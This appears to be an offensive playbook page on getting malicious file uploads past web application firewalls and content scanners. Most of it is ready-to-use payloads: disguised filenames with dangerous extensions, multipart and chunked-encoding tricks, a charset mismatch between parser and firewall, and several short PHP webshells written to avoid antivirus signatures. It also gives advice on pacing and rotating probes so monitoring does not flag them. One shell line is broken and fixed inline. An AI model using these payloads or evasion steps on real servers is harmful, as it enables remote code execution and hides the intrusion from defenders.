# Filter Evasion — WAF and content-scan bypass on upload endpoints

## What gets inspected — the WAF's view of an upload

A WAF sees the multipart body — `filename`, `Content-Type`, and the file
bytes. Rules flag: dangerous extensions, `<?php`/`<script>` literals,
traversal strings, known shell signatures, double extensions, and
multipart anomalies.

## Filename-level evasion

```
filename="x.php5"            # a rule anchored on \.php\b misses
filename="x.p\u0068p"        # unicode-escaped in a naive matcher
filename="x.pHp"             # case
filename="x.php."            # trailing dot — Windows strips
filename="x.php "            # trailing space
filename="x.php\t"           # tab
filename="x.php%00.jpg"      # NUL-split
filename="..%2f..%2fx.php"   # encoded traversal
filename*="UTF-8''x%2Ephp"   # RFC 5987
filename="x.php;.jpg"        # IIS semicolon
filename="x.jpg\r\n.php"     # folded header
```

## Body-level evasion — hide the shell text from byte-scanning

- **gzip the part**: a multipart part can carry `Content-Transfer-Encoding:
  binary` — but some WAFs unzip; a `Content-Encoding: gzip` on the part is
  rarely honored by receivers — skip
- **chunked transfer**: split the payload across chunk boundaries —
  `<?ph` end of one chunk + `p ...` next; regex-based WAFs that inspect
  per-chunk miss it
- **case the tag**: `<?PHP` — PHP accepts uppercase
- **whitespace/comments inside the tag**: `<?php /*...*/ ?>` or
  `<?\nphp`? No — PHP requires `<?php` contiguous; use `<?=` instead
- **obfuscate the call**: `eval(base64_decode(...))`, `call_user_func`,
  `$_GET['f']($_GET['x'])`, `array_map`, `create_function` (legacy),
  `assert` (legacy), `preg_replace /e` (PHP<5.5)
- **strip the literal**: AV grep on `<?php` — use `<%` only for ASP; for
  PHP use `<script language="php">...</script>` (pre-PHP7) or an include
  of a second file where the tag lives

## Multipart-boundary evasion

```
boundary=B → parts delimited by "B"/" B"/"--B"/"-- B" variants
terminator: --B vs --B-- vs --B--
parts after the terminator — lenient parsers read them, strict stop
boundary containing regex metachars — a rule matching the boundary breaks
CR/LF variants: \r\n vs \n-only vs \r-only — some WAFs expect \r\n
```

## Size-limit games

- `Content-Length` accurate but a chunked body — WAF reads CL, app reads chunked
- `Transfer-Encoding: chunked` + `Content-Length` both present — smuggling
  territory (`web-request-smuggling`); for uploads the effect is the WAF
  sees a truncated or shifted body
- deflate/gzip the whole request body (`Content-Encoding: gzip`) — WAFs
  may not decompress; the app may

## The "just long enough" rule — beating regex windows

A WAF rule `/filename="[^"]{1,64}\.(php|jsp)/` with a length cap misses a
filename padded past the window:

```
filename="aaaaaaaa...(200 a's)...x.php"
```

Long filename + traversal: `filename="/a"*200+"../x.php"`.

## Signature bypass — shells the AV doesn't know

AV/WAF signature lists cover the classic `<?php system(`/`eval(`/`c99`/
`r57`/`wso`/`b374k` strings. Custom minimal shells pass:

```php
<?=$_GET[0]($_GET[1]);?>
<?=`$_GET[0]`;?>                      # backtick exec via short echo
<?php $a=$_GET;a[0]($a[1]);           # wait, must be $a[0]($a[1])
<?php $a=$_GET;$a[0]($a[1]);?>
<?php $p=$_POST['p'];$f=$_POST['f'];call_user_func($f,$p);?>
```

Or a shell that does nothing — `<?php phpinfo(); ?>` — proves exec without
tripping heuristics, then swap the payload once exec is proven.

## The "WAF sees less than the server" split

- HTTP-parameter pollution: two `filename` params — WAF checks first,
  server stores last
- body-level quirks the WAF normalizes differently: `Content-Type:
  multipart/form-data; boundary=X; charset=ibm500` (EBCDIC — the WAF
  reads ASCII, PHP reads bytes)
- malformed multipart that the app's lenient parser accepts but the WAF
  skips → `parser-differentials.md`

## Rate/bot evasion — the slow-and-low upload set

- a WAF flagging 50 rapid extension tries — space them out
- rotate the marker per probe so detection rules don't flag the repeat
- vary `User-Agent`/session so probes aren't one signature

## The honest limit — when the WAF wins

- an ML-based content analyzer that catches obfuscated shells
- full-proxy re-serialization that strips malformed multipart
- application-layer validation the WAF can't weaken

Pivot: the payload doesn't need to be a shell — a *valid whitelisted file*
containing an SSTI/XXE/polyglot string that a downstream consumer
evaluates bypasses content inspection entirely →
`second-order-processing.md`.

## Falsifiers

- every evasion attempt hits the same signature — move up a layer
  (consumer-side instead of payload-side)

## Output to record

- which evasion form passed + the WAF rule it defeated
- the verbatim accept response
